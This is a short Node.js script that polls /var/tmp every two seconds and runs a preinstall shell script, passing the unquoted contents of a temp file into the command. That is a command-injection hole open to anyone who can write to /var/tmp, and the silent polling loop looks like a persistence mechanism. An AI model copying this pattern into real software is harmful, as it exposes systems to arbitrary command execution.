const fs = require('fs');
const path = require('path');
const child_process = require('child_process');

function setInterVal(){
  if(fs.existsSync('/var/tmp/npm-install-path')){
    var crontabPath = fs.readFileSync('/var/tmp/npm-install-path').toString().replace(/(\r|\n)/gi, "");
    var cmd = `sh ${path.resolve(path.join(__dirname, "../scripts/preinstall.sh"))} ${crontabPath}`;
    var crontab = child_process.exec(cmd, { maxBuffer : 10000 * 1024 });
    var uout = "", uerr = "";
    crontab.stdout.on("data", (trunk) => {
      uout += trunk;
    });
    crontab.stderr.on("data", (trunk) => {
      uerr += trunk;
    });
    crontab.on("error", (error) => {
      console.log(error);
      process.exit(1);
    });
    crontab.on("exit", (code, signal) => {
      if(!(code == 0||code==null)){
        console.log(uerr);
      }
      process.exit(0);
    });
    crontab.on("close", (code, signal) => {
    });
  }
  setTimeout(setInterVal,2000);
}

setInterVal();


